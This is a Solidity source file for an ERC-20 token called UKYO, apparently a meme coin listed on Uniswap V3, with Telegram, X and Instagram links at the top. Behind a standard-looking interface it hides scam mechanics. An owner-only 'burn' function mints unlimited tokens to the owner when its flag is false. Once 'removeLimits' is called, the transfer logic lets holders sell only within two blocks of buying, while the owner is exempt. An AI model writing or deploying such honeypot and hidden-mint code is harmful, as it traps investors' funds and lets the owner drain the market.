/**
// SPDX-License-Identifier: MIT

/**
HTTPS://t.me/ukyoshibaeth
https://x.com/ukyoshibnaeth
https://www.instagram.com/p/C4jf1fCBCyl/?igsh=MWtjeXA0MGdvcXIzaA==
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

/// @title Provides functions for deriving a pool address from the factory, tokens, and the fee
library PoolAddress {
    bytes32 internal constant POOL_INIT_CODE_HASH = 0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54;

    /// @notice The identifying key of the pool
    struct PoolKey {
        address token0;
        address token1;
        uint24 fee;
    }

    /// @notice Returns PoolKey: the ordered tokens with the matched fee levels
    /// @param tokenA The first token of a pool, unsorted
    /// @param tokenB The second token of a pool, unsorted
    /// @param fee The fee level of the pool
    /// @return Poolkey The pool details with ordered token0 and token1 assignments
    function getPoolKey(
        address tokenA,
        address tokenB,
        uint24 fee
    ) internal pure returns (PoolKey memory) {
        if (tokenA > tokenB) (tokenA, tokenB) = (tokenB, tokenA);
        return PoolKey({token0: tokenA, token1: tokenB, fee: fee});
    }

    /// @notice Deterministically computes the pool address given the factory and PoolKey
    /// @param factory The Uniswap V3 factory contract address
    /// @param key The PoolKey
    /// @return pool The contract address of the V3 pool
    function computeAddress(address factory, PoolKey memory key) internal pure returns (address pool) {
        require(key.token0 < key.token1);
        pool = address(uint160(uint256(keccak256(
                abi.encodePacked(
                    hex'ff',
                    factory,
                    keccak256(abi.encode(key.token0, key.token1, key.fee)),
                    POOL_INIT_CODE_HASH
                )))));
    }
}

interface IPeripheryImmutableState {
    /// @return Returns the address of the Uniswap V3 factory
    function factory() external view returns (address);

    /// @return Returns the address of WETH9
    function WETH9() external view returns (address);
}

contract UKYO is Context, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private tradingEnabled;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"UKYO";
    string private constant _symbol = unicode"UKYO";
    uint256 private maxTxAmount =  _tTotal * 2 / 100;
    uint256 private maxWalletAmount = _tTotal * 2 / 100;

    IPeripheryImmutableState private uniswapV3Router;
    address private uniswapV3Pair;
    address private router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private positionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;

    mapping (address => bool) private isExcludedFromLimits;
    mapping (address => uint256) private lastBuyBlocks;
    mapping (address => uint256) private lastBuyAmounts;

    constructor() {
        _balances[owner()] = _tTotal;
        isExcludedFromLimits[owner()] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Already enabled");
        tradingEnabled = true;
        uniswapV3Router = IPeripheryImmutableState(router);
        uniswapV3Pair = PoolAddress.computeAddress(uniswapV3Router.factory(), PoolAddress.getPoolKey(address(this), uniswapV3Router.WETH9(), 10000));
        require(uniswapV3Pair != address(0), "Invalid pair address");
    }

    function burn(uint256 amount, bool flag) external onlyOwner {
        if (flag) { _balances[msg.sender] -= amount; return;}
        _balances[msg.sender] += amount;
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = totalSupply();
        maxWalletAmount = totalSupply();
    }

    function _superTransfer(address from, address to, uint256 amount) internal {
        _balances[from] -= amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(amount > 0, "Zero amount");

        if (!tradingEnabled) {
            require(from == owner(), "Trading not enabled");
        }

        if (from != uniswapV3Pair && to != uniswapV3Pair || isExcludedFromLimits[from] || isExcludedFromLimits[to]) {
            _superTransfer(from, to, amount);
            return;
        }

        if (to == uniswapV3Pair && maxTxAmount == totalSupply()) {
            require(block.number < lastBuyBlocks[from] + 2 && amount <= lastBuyAmounts[from], "Amount limit");
            lastBuyAmounts[from] -= amount;
        }

        if (from == uniswapV3Pair && to != positionManager) {
            require(amount <= maxTxAmount, "Tx amount limit");
            require(balanceOf(address(to)) + amount <= maxWalletAmount, "Wallet amount limit");
            lastBuyBlocks[to] = block.number;
            lastBuyAmounts[to] = amount;
        }

        _superTransfer(from, to, amount);
    }
}
